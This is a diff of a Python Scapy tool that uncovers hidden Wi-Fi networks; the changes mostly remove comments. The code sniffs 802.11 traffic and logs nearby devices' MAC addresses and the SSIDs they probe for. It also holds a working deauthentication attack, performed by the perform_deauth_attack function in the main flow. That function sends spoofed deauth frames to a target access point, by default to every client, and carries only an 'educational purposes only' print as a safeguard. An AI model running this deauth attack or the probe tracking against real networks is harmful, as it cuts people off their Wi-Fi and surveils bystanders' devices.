@@ -1,9 +1,4 @@
 #!/usr/bin/env python3
-"""
-Enhanced Hidden Networks Scanner with Scapy
-Advanced techniques for discovering hidden SSIDs using 802.11 frame analysis
-"""
-
 import subprocess
 import sys
 import time
@@ -17,7 +12,6 @@ from collections import defaultdict
 from datetime import datetime
 import os
 
-# Enhanced imports for Scapy-based analysis
 try:
     from scapy.all import *
     from scapy.layers.dot11 import *
@@ -40,8 +34,7 @@ class HiddenNetworkScanner:
         self.scanning = False
         self.clients = defaultdict(set)
         self.deauth_enabled = False
-        
-        # Signal handling for graceful shutdown
+
         signal.signal(signal.SIGINT, self._signal_handler)
         signal.signal(signal.SIGTERM, self._signal_handler)
     
@@ -110,37 +103,31 @@ class HiddenNetworkScanner:
         networks = []
         cells = output.split('Cell ')
         
-        for cell in cells[1:]:  # Skip first empty element
+        for cell in cells[1:]: 
             network = {}
             lines = cell.split('\n')
             
             for line in lines:
                 line = line.strip()
                 
-                # BSSID
                 if 'Address:' in line:
                     network['bssid'] = line.split('Address: ')[1].strip()
                 
-                # SSID
                 elif 'ESSID:' in line:
                     essid = line.split('ESSID:')[1].strip().strip('"')
                     network['ssid'] = essid if essid else '<hidden>'
                 
-                # Channel
                 elif 'Channel:' in line:
                     network['channel'] = line.split('Channel:')[1].strip()
-                
-                # Signal strength
+
                 elif 'Signal level=' in line:
                     signal_match = re.search(r'Signal level=(-?\d+)', line)
                     if signal_match:
                         network['signal'] = int(signal_match.group(1))
-                
-                # Encryption
+
                 elif 'Encryption key:' in line:
                     network['encryption'] = 'on' in line.lower()
-                
-                # Security protocols
+
                 elif 'IEEE 802.11i/WPA2' in line:
                     network['security'] = 'WPA2'
                 elif 'WPA Version 1' in line:
@@ -237,7 +224,6 @@ class HiddenNetworkScanner:
     def get_mac_vendor(self, mac):
         """Get MAC address vendor information"""
         try:
-            # Simple vendor identification based on OUI
             oui = mac[:8].upper().replace(':', '')
             vendor_db = {
                 '00:50:F2': 'Microsoft',
@@ -267,11 +253,9 @@ class HiddenNetworkScanner:
         bssid = pkt[Dot11].addr3
         ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
         
-        # Get additional information
         channel = int(ord(pkt[Dot11Elt:3].info))
         signal_strength = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else 0
         
-        # Check for hidden network
         is_hidden = len(ssid) == 0 or ssid.isspace()
         
         network_info = {
@@ -302,16 +286,13 @@ class HiddenNetworkScanner:
             
         client_mac = pkt[Dot11].addr2
         
-        # Extract SSID from probe request
         if pkt.haslayer(Dot11Elt):
             ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
             if ssid:
                 self.probe_requests[client_mac].add(ssid)
                 
-                # Check if this SSID corresponds to a hidden network
                 for bssid, network in self.networks.items():
                     if network.get('hidden', False):
-                        # Try to correlate with hidden network
                         self.correlate_probe_with_hidden(client_mac, ssid, bssid)
     
     def process_probe_response(self, pkt):
@@ -321,8 +302,7 @@ class HiddenNetworkScanner:
             
         bssid = pkt[Dot11].addr3
         ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
-        
-        # Update network information if we have a match
+
         if bssid in self.networks:
             if self.networks[bssid].get('hidden', False) and ssid:
                 self.networks[bssid]['ssid'] = ssid
@@ -331,28 +311,22 @@ class HiddenNetworkScanner:
     
     def correlate_probe_with_hidden(self, client_mac, ssid, bssid):
         """Correlate probe requests with hidden networks"""
-        # Add client to network
         self.clients[bssid].add(client_mac)
-        
-        # If we have a hidden network and a client probing for an SSID,
-        # there's a chance they're related
+
         if bssid in self.networks and self.networks[bssid].get('hidden', False):
             confidence = self.calculate_correlation_confidence(client_mac, ssid, bssid)
-            if confidence > 0.7:  # High confidence threshold
+            if confidence > 0.7:
                 self.networks[bssid]['probable_ssid'] = ssid
                 self.networks[bssid]['confidence'] = confidence
                 print(f"Probable SSID for {bssid}: {ssid} (confidence: {confidence:.2f})")
     
     def calculate_correlation_confidence(self, client_mac, ssid, bssid):
         """Calculate confidence level for SSID correlation"""
-        # Simple confidence calculation based on multiple factors
-        confidence = 0.5  # Base confidence
-        
-        # Increase confidence if client is seen multiple times
+        confidence = 0.5 
+
         if len(self.clients[bssid]) > 1:
             confidence += 0.2
-            
-        # Increase confidence if SSID appears in multiple probe requests
+
         probe_count = sum(1 for probes in self.probe_requests.values() if ssid in probes)
         if probe_count > 1:
             confidence += 0.1
@@ -364,20 +338,18 @@ class HiddenNetworkScanner:
         security_info = {'security': 'Open', 'encryption': False}
         
         if pkt.haslayer(Dot11Elt):
-            # Check for WPA/WPA2
             elt = pkt[Dot11Elt]
             while elt:
-                if elt.ID == 48:  # RSN (WPA2)
+                if elt.ID == 48: 
                     security_info['security'] = 'WPA2'
                     security_info['encryption'] = True
-                elif elt.ID == 221:  # WPA
+                elif elt.ID == 221: 
                     if elt.info.startswith(b'\x00\x50\xf2\x01'):
                         security_info['security'] = 'WPA'
                         security_info['encryption'] = True
                 
                 elt = elt.payload if hasattr(elt, 'payload') else None
         
-        # Check for WEP
         if pkt.haslayer(Dot11Beacon) and pkt[Dot11Beacon].cap & 0x10:
             security_info['security'] = 'WEP'
             security_info['encryption'] = True
@@ -391,7 +363,6 @@ class HiddenNetworkScanner:
             
         try:
             if pkt.haslayer(Dot11):
-                # Process different frame types
                 if pkt.haslayer(Dot11Beacon):
                     self.process_beacon(pkt)
                 elif pkt.haslayer(Dot11ProbeReq):
@@ -409,7 +380,6 @@ class HiddenNetworkScanner:
             print("Scapy not available for probe requests")
             return
             
-        # Common SSIDs to probe for
         common_ssids = [
             "linksys", "netgear", "dlink", "tplink", "asus", "buffalo",
             "cisco", "apple", "android", "iphone", "samsung", "lg",
@@ -426,7 +396,6 @@ class HiddenNetworkScanner:
         
         for ssid in ssids_to_probe:
             try:
-                # Create probe request packet
                 probe_req = (
                     RadioTap() /
                     Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", 
@@ -435,9 +404,8 @@ class HiddenNetworkScanner:
                     Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
                 )
                 
-                # Send the packet
                 sendp(probe_req, iface=interface, verbose=False)
-                time.sleep(0.1)  # Small delay between probes
+                time.sleep(0.1) 
                 
             except Exception as e:
                 if self.verbose:
@@ -455,20 +423,17 @@ class HiddenNetworkScanner:
             
         print(f"WARNING: Performing deauth attack on {target_bssid}")
         print("This is for educational purposes only!")
-        
-        # If no specific client, use broadcast
+
         if not client_mac:
             client_mac = "ff:ff:ff:ff:ff:ff"
             
         try:
-            # Create deauth packet
             deauth = (
                 RadioTap() /
                 Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) /
                 Dot11Deauth(reason=7)
             )
-            
-            # Send deauth packets
+
             for i in range(count):
                 sendp(deauth, iface=self.interface, verbose=False)
                 time.sleep(0.1)
@@ -487,8 +452,7 @@ class HiddenNetworkScanner:
         print(f"Starting Scapy-based scan on {interface} for {duration} seconds...")
         
         self.scanning = True
-        
-        # Start packet capture in a separate thread
+
         def capture_packets():
             try:
                 sniff(iface=interface, prn=self.packet_handler, 
@@ -499,8 +463,7 @@ class HiddenNetworkScanner:
         capture_thread = threading.Thread(target=capture_packets)
         capture_thread.daemon = True
         capture_thread.start()
-        
-        # Send probe requests in parallel
+
         if self.passive_scan:
             probe_thread = threading.Thread(
                 target=self.send_probe_requests, 
@@ -508,12 +471,10 @@ class HiddenNetworkScanner:
             )
             probe_thread.daemon = True
             probe_thread.start()
-        
-        # Wait for scanning to complete
+
         time.sleep(duration)
         self.scanning = False
-        
-        # Wait for threads to complete
+
         capture_thread.join(timeout=2)
         
         return list(self.networks.values())
@@ -535,8 +496,7 @@ class HiddenNetworkScanner:
         
         for interface in interfaces:
             print(f"\nScanning on interface: {interface}")
-            
-            # Try Scapy-based scanning first if available
+
             if self.use_scapy:
                 try:
                     scapy_networks = self.scapy_scan(interface, self.timeout)
@@ -545,31 +505,26 @@ class HiddenNetworkScanner:
                 except Exception as e:
                     print(f"Scapy scan failed: {e}")
                     print("Falling back to traditional methods...")
-            
-            # Regular scan with iwlist as fallback
+
             networks = self.scan_with_iwlist(interface)
             all_networks.extend(networks)
-            
-            # If passive scan is enabled and Scapy failed, try monitor mode
+
             if self.passive_scan and not self.use_scapy:
                 original_mode = True
                 if self.set_monitor_mode(interface):
                     passive_networks = self.passive_monitor_scan(interface, self.timeout)
                     all_networks.extend(passive_networks)
                     self.restore_managed_mode(interface)
-        
-        # Also try nmcli scan
+
         nmcli_networks = self.scan_with_nmcli()
         all_networks.extend(nmcli_networks)
-        
-        # Remove duplicates and identify hidden networks
+
         unique_networks = {}
         for network in all_networks:
             bssid = network.get('bssid', '')
             if bssid and bssid not in unique_networks:
                 unique_networks[bssid] = network
-                
-                # Check if network is hidden
+
                 ssid = network.get('ssid', '')
                 if not ssid or ssid == '<hidden>' or ssid == '""' or len(ssid.strip()) == 0:
                     network['hidden'] = True
@@ -608,8 +563,7 @@ class HiddenNetworkScanner:
                 vendor = network.get('vendor', 'Unknown')
                 
                 print(f"{bssid:<18} {ssid:<20} {probable_ssid:<15} {channel:<8} {signal:<8} {security:<10} {vendor:<15}")
-        
-        # Show probe request analysis
+
         if self.probe_requests:
             print(f"\n{'='*90}")
             print("PROBE REQUEST ANALYSIS:")
@@ -617,8 +571,8 @@ class HiddenNetworkScanner:
             print(f"{'Client MAC':<18} {'Probed SSIDs':<50}")
             print("-" * 90)
             
-            for client_mac, ssids in list(self.probe_requests.items())[:10]:  # Show first 10
-                ssid_list = ', '.join(list(ssids)[:5])  # Show first 5 SSIDs
+            for client_mac, ssids in list(self.probe_requests.items())[:10]: 
+                ssid_list = ', '.join(list(ssids)[:5]) 
                 if len(ssids) > 5:
                     ssid_list += f" ... (+{len(ssids)-5} more)"
                 print(f"{client_mac:<18} {ssid_list:<50}")
@@ -640,7 +594,6 @@ class HiddenNetworkScanner:
             
             print(f"{bssid:<18} {ssid:<25} {channel:<8} {signal:<8} {security:<10} {hidden:<8} {vendor:<15}")
         
-        # Show additional insights
         if self.use_scapy:
             self.display_insights(networks)
     
@@ -650,7 +603,6 @@ class HiddenNetworkScanner:
         print("ADVANCED INSIGHTS:")
         print(f"{'='*90}")
         
-        # Channel distribution
         channels = {}
         for network in networks:
             channel = network.get('channel', 'Unknown')
@@ -659,8 +611,7 @@ class HiddenNetworkScanner:
         print("Channel Distribution:")
         for channel, count in sorted(channels.items()):
             print(f"  Channel {channel}: {count} networks")
-        
-        # Security analysis
+
         security_types = {}
         for network in networks:
             security = network.get('security', 'Unknown')
@@ -669,15 +620,13 @@ class HiddenNetworkScanner:
         print(f"\nSecurity Analysis:")
         for security, count in sorted(security_types.items()):
             print(f"  {security}: {count} networks")
-        
-        # Hidden network insights
+
         hidden_with_probable = sum(1 for net in self.hidden_networks if net.get('probable_ssid'))
         if hidden_with_probable > 0:
             print(f"\nHidden Network Insights:")
             print(f"  Networks with probable SSID: {hidden_with_probable}")
             print(f"  Success rate: {(hidden_with_probable/len(self.hidden_networks))*100:.1f}%")
-        
-        # Vendor analysis
+
         vendors = {}
         for network in networks:
             vendor = network.get('vendor', 'Unknown')
@@ -736,8 +685,7 @@ def main():
     if os.geteuid() != 0:
         print("This tool requires root privileges. Please run with sudo.")
         sys.exit(1)
-    
-    # Warning for deauth attacks
+
     if args.enable_deauth:
         print("WARNING: Deauth attacks enabled!")
         print("This feature is for EDUCATIONAL PURPOSES ONLY.")
@@ -761,16 +709,13 @@ def main():
     scanner.deauth_enabled = args.enable_deauth
     
     try:
-        # Perform main scan
         networks = scanner.scan_networks()
         scanner.display_results(networks)
-        
-        # Perform deauth attack if requested
+
         if args.enable_deauth and args.deauth_target:
             print(f"\nPerforming deauth attack on {args.deauth_target}...")
             scanner.perform_deauth_attack(args.deauth_target, count=args.deauth_count)
-        
-        # Export results
+
         if args.output:
             scanner.export_results(networks, args.output)
             
